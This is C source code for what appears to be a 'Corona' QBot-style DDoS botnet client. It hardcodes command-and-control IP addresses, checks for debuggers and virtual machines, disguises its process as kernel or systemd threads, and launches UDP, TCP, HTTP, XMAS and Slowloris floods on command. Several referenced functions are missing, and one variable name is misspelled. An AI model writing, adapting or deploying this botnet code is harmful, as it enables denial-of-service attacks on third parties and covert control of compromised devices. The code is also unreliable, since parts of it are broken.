#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <openssl/sha.h>
#include <sys/stat.h>
#include "killer.h"

#define SERVER_LIST_SIZE (sizeof(MainSocket))

// 𝖣𝗒𝗇𝖺𝗆𝗂𝖼 𝖢&𝖢 𝖼𝗈𝗇𝖿𝗂𝗀
char *bot_hosts[] = {"198.12.97.77", "185.62.58.93", "104.238.183.146"};
int bot_ports[] = {28, 1337, 8080};
int current_cnc = 0;
int cnc_count = 3;

int bot_port = 28;
char *bot_host = "198.12.97.77";

uint32_t *pids;
uint64_t numpids = 0;
int MainSocket = 0;

// 𝖡𝗈𝗍 𝖺𝗎𝗍𝗁𝖾𝗇𝗍𝗂𝖼𝖺𝗍𝗂𝗈𝗇
char auth_token[64] = "CoronaQBotSecureAuth2024";
char build_id[32] = {0};

// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸
void anti_analysis() {
    // 𝖢𝗁𝖾𝖼𝗄 𝖿𝗈𝗋 𝖼𝗈𝗆𝗆𝗈𝗇 𝖽𝖾𝖻𝗎𝗀𝗀𝖾𝗋𝗌/𝗌𝖺𝗇𝖽𝖻𝗈𝗑𝖾𝗌
    if(getenv("LD_PRELOAD") != NULL) _exit(0);
    if(getenv("PYTHONPATH") != NULL) _exit(0);
    if(getenv("DEBUG") != NULL) _exit(0);
    
    // 𝖢𝗁𝖾𝖼𝗄 𝖿𝗈𝗋 𝗏𝗂𝗋𝗍𝗎𝖺𝗅𝗂𝗓𝖾𝖽 𝖾𝗇𝗏𝗂𝗋𝗈𝗇𝗆𝖾𝗇𝗍𝗌
    FILE *cpuinfo = fopen("/proc/cpuinfo", "r");
    if(cpuinfo) {
        char line[256];
        while(fgets(line, sizeof(line), cpuinfo)) {
            if(strstr(line, "hypervisor") || strstr(line, "QEMU") || 
               strstr(line, "VMware") || strstr(line, "VirtualBox")) {
                fclose(cpuinfo);
                _exit(0);
            }
        }
        fclose(cpuinfo);
    }
}

void hide_process() {
    char *fake_names[] = {
        "[kworker/0:0]", "[kworker/1:1]", "[ksoftirqd/0]", 
        "[migration/0]", "[rcu_sched]", "[watchdog/0]",
        "systemd-udevd", "systemd-journal", "systemd-timesyncd"
    };
    int name_index = rand() % (sizeof(fake_names)/sizeof(fake_names[0]));
    prctl(PR_SET_NAME, (unsigned long)fake_names[name_index], 0, 0, 0);
}

char *getBuild() {
#if defined(__x86_64__) || defined(_M_X64)
    return "ROOTS";
#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM";
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "ARM";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "MIPSEL";
#else
    return "UNKNOWN";
#endif
}

// 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝖾 𝖻𝗈𝗍 𝖨𝖣
void generate_bot_id(char *buffer, size_t len) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    
    char seed[512];
    snprintf(seed, sizeof(seed), "%s:%lu:%d:%s", hostname, time(NULL), getpid(), getBuild());
    
    SHA256_CTX ctx;
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, seed, strlen(seed));
    SHA256_Final(hash, &ctx);
    
    for(int i = 0; i < 16 && i*2 < len-1; i++) {
        sprintf(buffer + i*2, "%02x", hash[i]);
    }
}

void registermydevice(char *JoinName) {
    char registermsg[256];
    generate_bot_id(build_id, sizeof(build_id));
    
    sprintf(registermsg, "\e[0m\e[0;31m[\e[0;36mCorona\e[0;31m]\e[0m Device Joined As [%s] Arch: [%s] ID: [%s]\r\n", 
            JoinName, getBuild(), build_id);
    write(MainSocket, registermsg, strlen(registermsg));
}

// 𝖡𝗈𝗍 𝖺𝗎𝗍𝗁𝖾𝗇𝗍𝗂𝖼𝖺𝗍𝗂𝗈𝗇
int bot_authenticate(int sock) {
    char buffer[128];
    
    // 𝖲𝖾𝗇𝖽 𝖺𝗎𝗍𝗁 𝗍𝗈𝗄𝖾𝗇
    if(send(sock, auth_token, strlen(auth_token), MSG_NOSIGNAL) <= 0)
        return 0;
    
    // 𝖶𝖺𝗂𝗍 𝖿𝗈𝗋 𝗋𝖾𝗌𝗉𝗈𝗇𝗌𝖾
    fd_set fds;
    struct timeval tv;
    
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    
    if(select(sock + 1, &fds, NULL, NULL, &tv) <= 0)
        return 0;
    
    int len = recv(sock, buffer, sizeof(buffer)-1, 0);
    if(len <= 0) return 0;
    
    buffer[len] = 0;
    return (strstr(buffer, "AUTH_OK") != NULL);
}

char *Connection(char *namezz) {
    struct sockaddr_in vSparkzyy;
    int attempts = 0;
    
retryme:
    MainSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(MainSocket < 0) {
        sleep(5);
        goto retryme;
    }
    
    // 𝖱𝗈𝗍𝖺𝗍𝖾 𝖢&𝖢 𝗌𝖾𝗋𝗏𝖾𝗋𝗌
    current_cnc = (current_cnc + 1) % cnc_count;
    bot_host = bot_hosts[current_cnc];
    bot_port = bot_ports[current_cnc];
    
    vSparkzyy.sin_family = AF_INET;
    vSparkzyy.sin_port = htons(bot_port);
    vSparkyy.sin_addr.s_addr = inet_addr(bot_host);
    
    int check = connect(MainSocket, (struct sockaddr *)&vSparkzyy, sizeof(vSparkzyy));
    if(check == -1) {
        close(MainSocket);
        attempts++;
        if(attempts < 10) {
            sleep(5);
            goto retryme;
        } else {
            return NULL;
        }
    }
    
    // 𝖠𝗎𝗍𝗁𝖾𝗇𝗍𝗂𝖼𝖺𝗍𝖾 𝗐𝗂𝗍𝗁 𝖢&𝖢
    if(!bot_authenticate(MainSocket)) {
        close(MainSocket);
        sleep(5);
        goto retryme;
    }
    
end:
    registermydevice(namezz);
    return 0;
}

// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖠𝖳𝖳𝖠𝖢𝖪 𝖬𝖤𝖳𝖧𝖮𝖣𝖲
void send_slowloris(char *host, int port, int timeEnd) {
    int sock, i;
    char request[512];
    
    for(i = 0; i < 500; i++) {
        if(fork() == 0) {
            time_t start = time(NULL);
            while(time(NULL) < start + timeEnd) {
                sock = socket_connect(host, port);
                if(sock > 0) {
                    sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\n", host);
                    send(sock, request, strlen(request), MSG_NOSIGNAL);
                    sleep(timeEnd);
                }
                close(sock);
            }
            _exit(0);
        }
    }
}

void proc_cmd(int argc, unsigned char **argv) {
    if(!strcmp(argv[0], "UDP")) {
        if(argc <4) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]), time = atoi(argv[3]), packetsize = atoi(argv[4]);
        if(!fork()) {
            printf("[UDP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            udpattack(ip, port, time, packetsize);
            _exit(0);
        }
        return;
    }
    
    if (!strcmp(argv[0], "HTTP")) {
        if (argc < 6) return;
        if(!fork()) {
            printf("[HTTP] Attack Being Sent \r\n");
            SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            _exit(0);
        }
        return;
    }

    if(!strcmp(argv[0], "TCP")) {
        if(argc < 5) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        unsigned char *flags = argv[4];
        if(!fork()) {
            printf("[TCP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            SendTCP(ip, port, time, flags);
            _exit(0);
        }
        return;
    }

    if(!strcmp(argv[0], "STD")) {
        if(argc < 4) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(!fork()) {
            printf("[STD] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            sendSTD(ip, port, time);
            _exit(0);
        }
        return;
    }
    
    if(!strcmp(argv[0], "XMAS")) {
        if(argc < 4) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(!fork()) {
            printf("[XMAS] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            xmas(ip, port, time);
            _exit(0);
        }
        return;
    }
    
    if(!strcmp(argv[0], "SLOWLORIS")) {
        if(argc < 4) return;
        char *host = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(!fork()) {
            send_slowloris(host, port, time);
            _exit(0);
        }
        return;
    }
    
    if(strstr(argv[0], "hahawekillyou")) {
        printf("\r\n[Corona] Disconnected! \r\n");
        kill_bk();
        _exit(0);
    }
    
    if(strstr(argv[0], "bkstop")) {
        printf("\r\n[BotKiller] Stopped! \r\n");
        kill_bk();
    }

    if(!strcmp(argv[0], "KT")) {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }
    }
}

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define LOCALHOST (inet_addr("127.0.0.1"))

static void ensure_bind(uint32_t bind_addr) {
    int fd = -1;
    struct sockaddr_in addr;
    
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1) {
        return;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888);
    addr.sin_addr.s_addr = bind_addr;
    
    NONBLOCK(fd);
    errno = 0;
    
    int ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    int e = errno;
    
    if(ret == -1 && e == EADDRNOTAVAIL) {
        close(fd);
        sleep(1);
        ensure_bind(LOCALHOST);
        return;
    }
    
    if(ret == -1 && e == EADDRINUSE) {
        close(fd);
        _exit(1);
    }
    
    listen(fd, 1);
    close(fd);
    return;
}

static uint32_t local_addr(void) {
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1) {
        return 0;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);
    
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    
    return addr.sin_addr.s_addr;
}

void recv_buf() {
    char buf[512];
    while(read(MainSocket, buf, sizeof(buf)) > 0) {
        int r, argcount = 0;
        unsigned char *buffer[12 + 1] = {0};
        char *strr;
        
        for(strr = strtok(buf, " "); strr != NULL; strr = strtok(NULL, " ")) {
            if(argcount >= 12) break;
            
            buffer[argcount] = malloc(strlen(strr) + 1);
            if(!buffer[argcount]) break;
            
            strcpy(buffer[argcount], strr);
            argcount++;
        }
        
        if(argcount > 0) {
            proc_cmd(argcount, buffer);
        }
        
        for(r = 0; r < argcount; r++) {
            if(buffer[r]) free(buffer[r]);
        }
    }
}

int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

int main(int argc, unsigned char * argv[]) {
    // 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖠𝖭𝖳𝖨-𝖠𝖭𝖠𝖫𝖸𝖲𝖨𝖲
    anti_analysis();
    
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    uint32_t local;
    local = local_addr();
    ensure_bind(local);
    
    pid_t pid = fork();
    if(pid > 0) _exit(0);
    if(pid < 0) _exit(1);
    
    // 𝖯𝖱𝖮𝖢𝖤𝖲𝖲 𝖲𝖳𝖤𝖠𝖫𝖳𝖧
    hide_process();
    
    if (SERVER_LIST_SIZE <= 0) return 0;
    
    // 𝖲𝗍𝖾𝖺𝗅𝗍𝗁
    strncpy(argv[0], "", strlen(argv[0]));
    
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    
    // 𝖱𝖤𝖲𝖨𝖫𝖨𝖤𝖭𝖳 𝖢𝖮𝖭𝖭𝖤𝖢𝖳𝖨𝖮𝖭 𝖫𝖮𝖮𝖯
    while(1) {
        if(Connection(argv[1]) == NULL) {
            // 𝖤𝖷𝖯𝖮𝖭𝖤𝖭𝖳𝖨𝖠𝖫 𝖡𝖠𝖢𝖪𝖮𝖥𝖥
            static int backoff = 1;
            sleep(backoff);
            backoff = (backoff < 300) ? backoff * 2 : 300;
            continue;
        }
        
        botkiller(MainSocket);
        recv_buf();
        
        close(MainSocket);
        sleep(5);
    }
    
    return 0;
}